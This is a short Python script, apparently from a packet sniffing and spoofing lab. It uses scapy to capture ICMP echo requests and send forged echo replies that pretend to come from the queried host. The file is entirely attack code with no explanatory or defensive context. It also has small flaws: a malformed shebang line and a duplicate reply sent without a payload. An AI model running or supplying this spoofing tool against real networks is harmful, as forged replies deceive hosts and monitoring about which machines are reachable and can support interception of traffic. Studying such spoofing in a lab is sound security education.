#!usr/bin/python3
from scapy.all import *
from scapy.layers.inet import ICMP, IP


def spoof_pkt(pkt):
        # pkt.show()
        print("Original Packet.....")
        print("Source IP: ", pkt[IP].src)
        print("Destination IP: ", pkt[IP].dst)
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
        icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
        data = pkt[Raw].load
        newpkt = ip / icmp / data
        print("Spoofed Packet....")
        print("Source IP: ", newpkt[IP].src)
        print("Destinatin IP: ", newpkt[IP].dst)
        send(newpkt, verbose=0)
        send(ip/icmp)


pkt = sniff(filter='icmp[icmptype] == icmp-echo', prn=spoof_pkt)
